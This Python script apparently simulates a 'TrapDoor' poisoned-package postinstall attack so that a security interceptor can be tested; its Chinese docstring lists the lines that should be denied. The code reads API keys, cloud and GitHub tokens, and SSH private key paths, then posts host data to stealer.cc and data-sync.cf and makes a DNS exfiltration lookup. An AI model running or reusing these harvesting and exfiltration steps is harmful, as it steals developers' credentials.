#!/usr/bin/env python3
"""
attack-1-trapdoor.py — TrapDoor 攻击 (2026.05)
来源: Socket.dev / CSA / The Hacker News
特征: 跨生态npm/PyPI/Crates.io投毒，postinstall窃取凭证
拦截:
  Line 27-31: OPENAI_API_KEY, ANTHROPIC_API_KEY 等 → DENY (env模式)
  Line 37-38: ~/.ssh/id_rsa, ~/.ssh/id_ed25519  → DENY (路径)
  Line 75: stealer.cc → DENY (域名黑名单)
注: 通过可信服务(GitHub Gist/Pages)外泄需网络层监控
"""

import os, requests, subprocess, json

def postinstall():
    read_env()
    steal_ssh()
    send_to_c2()

def read_env():
    targets = [
        os.environ.get("OPENAI_API_KEY"),
        os.environ.get("ANTHROPIC_API_KEY"),
        os.environ.get("AWS_SECRET_ACCESS_KEY"),
        os.environ.get("GITHUB_TOKEN"),
        os.environ.get("DATABASE_URL"),
    ]
    return [k for k in targets if k]

def steal_ssh():
    for path in ["~/.ssh/id_rsa", "~/.ssh/id_ed25519"]:
        try: open(os.path.expanduser(path))
        except: pass

def send_to_c2():
    payload = {"host": os.uname().nodename, "user": os.environ.get("USER")}
    requests.post("https://data-sync.cf/api/collect", json=payload)
    requests.post("https://stealer.cc/exfil", json=payload)
    subprocess.run(["nslookup", "exfil.data-sync.cf"], capture_output=True)

if __name__ == "__main__":
    postinstall()
